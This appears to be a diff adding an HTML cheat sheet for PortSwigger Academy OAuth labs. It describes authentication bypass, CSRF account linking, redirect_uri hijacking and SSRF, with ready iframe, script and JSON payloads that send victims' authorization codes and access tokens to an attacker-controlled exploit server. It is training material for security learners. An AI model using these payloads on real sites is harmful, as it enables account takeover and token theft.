@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>OAUTH Authentication</title>
+  <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+<header id="title-block-header">
+</header>
+<h1 id="oauth-authentication">OAuth Authentication</h1>
+<h2 id="summary">Summary</h2>
+<ul>
+<li><p><a href="#recon">Recon for OAuth Authentication</a></p></li>
+<li><p><a href="#cheat-sheet">Portswigger Labs Cheat Sheet /
+Payloads</a></p></li>
+<li><p>Additional Note: There is a PDF attached in this folder that has
+a walk-through of the complete labs. The document does not need to be
+downloaded, it can be viewed inline in GitHub.</p></li>
+</ul>
+<p><br><br></p>
+<h2 id="recon">Recon</h2>
+<ul>
+<li><p>Links:</p>
+<ul>
+<li>https://portswigger.net/web-security/oauth#identifying-oauth-authentication</li>
+</ul></li>
+</ul>
+<p><br><br></p>
+<h2 id="cheat-sheet">Cheat Sheet</h2>
+<p><br><br></p>
+<h3
+id="authentication-bypass-via-oauth-implicit-flow."><strong>Authentication
+Bypass via OAuth Implicit Flow.</strong></h3>
+<ul>
+<li><p>After the client application has received the access token for a
+user from the OAuth service, it will retrieve information about the user
+from the OAuth service “user endpoint”.</p></li>
+<li><p>The client application will then submit the user’s email and
+access token to their own endpoint for authentication. (Here the access
+token is acting like a “traditional” password.)</p></li>
+<li><p>However, by changing the email parameter to another user’s email,
+we can log into the application as any arbitrary user, essentially
+bypassing authentication.</p></li>
+</ul>
+<figure>
+<img
+src="https://github.com/ChrisM-X/PortSwigger-Academy-CheatSheets/blob/master/OAuth%20Authentication/Images/Picture1.png"
+alt="auth1" />
+<figcaption aria-hidden="true">auth1</figcaption>
+</figure>
+<p><br><br></p>
+<h3
+id="csrf-attack---missing-state-parameter.-forced-oauth-profile-linking"><strong>CSRF
+Attack - Missing “state” Parameter. (Forced OAuth profile
+linking)</strong></h3>
+<ul>
+<li><p>An application is allowing users to attach their social media
+account to their normal application account.</p></li>
+<li><p>When the client application submits the “Authorization Request”
+to the OAuth Service, the “state” parameter is not included with the
+request. This behavior can be used to perform a CSRF like
+attack.</p></li>
+<li><p>Go through a normal OAuth workflow and capture the “Authorization
+Code Grant” request using Burp Proxy (then drop the request, the request
+will look like this - /oauth-linking?code=xxxxx).</p></li>
+<li><p>We will use this request as the CSRF exploit to attack other
+users and to attach our social media account to their normal application
+account. Once the payload is delivered to the victim user, log into the
+application again using the “Social Media Login” function and we gain
+access to the admin account.</p></li>
+<li><p>See lab/document for more details.</p></li>
+<li><p>Example CSRF Payload: (Use in the Exploit Server to host
+it.)</p></li>
+</ul>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">iframe</span><span class="ot"> src</span><span class="op">=</span><span class="st">&quot;https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=UNUSED-CODE&quot;</span><span class="dt">&gt;&lt;/</span><span class="kw">iframe</span><span class="dt">&gt;</span></span></code></pre></div>
+<p><br><br></p>
+<h3
+id="csrf-attack---missing-validation-redirect_uri-parameter.-oauth-account-hijacking-via-redirect_uri"><strong>CSRF
+Attack - Missing Validation “redirect_uri” Parameter. (OAuth account
+hijacking via redirect_uri)</strong></h3>
+<ul>
+<li><p>The “redirect_uri” parameter is not being validated properly in
+the “Authorization Request”. Create an CSRF exploit that contains this
+“Authorization Request” along with a “redirect_uri” value to a domain
+you control.</p></li>
+<li><p>When the OAuth server sends back the authorization code, it will
+append it to the domain specified in the “redirect_uri” and we can check
+in our Exploit server logs to obtain another user’s auth code, which can
+now be submitted to the original “callback” URL of the application and
+log into their account.</p></li>
+<li><p>Example CSRF Payload: (Use in the Exploit Server to host
+it.)</p></li>
+</ul>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">iframe</span><span class="ot"> src</span><span class="op">=</span><span class="st">&quot;https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID</span><span class="er">&amp;</span><span class="st">redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net</span><span class="er">&amp;</span><span class="st">response_type=code</span><span class="er">&amp;</span><span class="st">scope=openid%20profile%20email&quot;</span><span class="dt">&gt;&lt;/</span><span class="kw">iframe</span><span class="dt">&gt;</span></span></code></pre></div>
+<ul>
+<li>Now use the stolen oauth code within the client application’s
+callback URL:</li>
+</ul>
+<div class="sourceCode" id="cb3"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a>https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN-CODE</span></code></pre></div>
+<figure>
+<img
+src="https://github.com/ChrisM-X/PortSwigger-Academy-CheatSheets/blob/master/OAuth%20Authentication/Images/Picture2.png"
+alt="auth2" />
+<figcaption aria-hidden="true">auth2</figcaption>
+</figure>
+<p><br><br></p>
+<h3
+id="csrf-open-redirection-directory-traversal---bypassing-flawed-redirect_uri-parameter-validation.-stealing-oauth-access-tokens-via-an-open-redirect"><strong>CSRF
++ Open Redirection + Directory Traversal - Bypassing Flawed
+“redirect_uri” Parameter Validation. (Stealing OAuth access tokens via
+an open redirect)</strong></h3>
+<ul>
+<li><p>The OAuth server is not properly validating the “redirect_uri”
+parameter in the client application’s “Authorization Request”.</p></li>
+<li><p>The domain can’t be manipulated, however, by using a directory
+traversal vulnerability we can point the “redirect_uri” value to another
+location within the client’s application. This other location in the
+client’s application also contains an open redirection vulnerability
+which can be used to direct the request to an arbitrary domain like the
+Exploit Server.</p></li>
+<li><p>Combining these 2 vulnerabilities along with a CSRF exploit, we
+can capture an access token (Implicit grant flow is used here.) that
+belongs to another user. And use that token to access the victim user’s
+information.</p></li>
+<li><p>Final payload to be hosted in the Exploit Server:</p>
+<ul>
+<li><p>This will force the victim user to first visit the malicious URL
+then a request will be submitted to the Exploit Server with the access
+token appended to the request. (The access token is sent in fragment
+-&gt; #xxxx)</p></li>
+<li><p>The “redirect_uri” parameters contains the traversal and open
+redirection vulnerability location.</p></li>
+<li><p>Deliver the payload to the victim user and check the Exploit
+Server logs for the access token.</p></li>
+</ul></li>
+</ul>
+<div class="sourceCode" id="cb4"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>script<span class="op">&gt;</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> (<span class="op">!</span><span class="bu">document</span><span class="op">.</span><span class="at">location</span><span class="op">.</span><span class="at">hash</span>) {</span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>        <span class="bu">window</span><span class="op">.</span><span class="at">location</span> <span class="op">=</span> <span class="st">&#39;https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&amp;redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&amp;response_type=token&amp;nonce=399721827&amp;scope=openid%20profile%20email&#39;</span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>    } <span class="cf">else</span> {</span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>        <span class="bu">window</span><span class="op">.</span><span class="at">location</span> <span class="op">=</span> <span class="st">&#39;/?&#39;</span><span class="op">+</span><span class="bu">document</span><span class="op">.</span><span class="at">location</span><span class="op">.</span><span class="at">hash</span><span class="op">.</span><span class="fu">substr</span>(<span class="dv">1</span>)</span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;/</span>script<span class="op">&gt;</span></span></code></pre></div>
+<ul>
+<li>See lab document for more details.</li>
+</ul>
+<p><br><br></p>
+<h3 id="ssrf-via-openid-dynamic-client-registration."><strong>SSRF via
+OpenID Dynamic Client Registration.</strong></h3>
+<ul>
+<li><p>An attacker can dynamically register a client application with
+the OAuth server. The registration endpoint does not require any
+authentication.</p></li>
+<li><p>There is a request in the application that looks like this, which
+initiates a request to the endpoint that was specified within the
+“logo_uri” parameter upon client registration. The contents are returned
+in the response as well.:</p>
+<ul>
+<li>/client/{client-id}/logo</li>
+</ul></li>
+<li><p>We can register a new client with the OAuth server and specify
+Burp Collaborator endpoint within the “logo_uri” parameter to identify
+if an in-band SSRF attack is possible.</p></li>
+<li><p>Since the contents of the request are returned in the response,
+this is considered an in-band SSRF vulnerability and can be used to
+retrieve sensitive internal system information.</p></li>
+<li><p>The following payload was injected in the body of the OAuth’s
+service registration endpoint:</p></li>
+</ul>
+<div class="sourceCode" id="cb5"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;redirect_uris&quot;</span> <span class="fu">:</span> <span class="ot">[</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;https://example.com&quot;</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>    <span class="ot">]</span><span class="fu">,</span></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;logo_uri&quot;</span> <span class="fu">:</span> <span class="st">&quot;https://BURP-COLLABORATOR-SUBDOMAIN&quot;</span></span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
+<ul>
+<li>See lab document/section for more details. -
+https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration</li>
+</ul>
+<p><br><br></p>
+<h3 id="stealing-oauth-access-tokens-via-a-proxy-page"><strong>Stealing
+OAuth access tokens via a proxy page</strong></h3>
+<ul>
+<li>Link:
+https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page</li>
+</ul>
+<p><br><br><br></p>
+<h3
+id="pending-to-complete-labs-that-are-missing-from-cheat-sheet">Pending
+to complete labs that are missing from cheat sheet:</h3>
+<ul>
+<li>All labs in this category are completed and referenced in cheat
+sheet or attached document.</li>
+</ul>
+</body>
+</html>
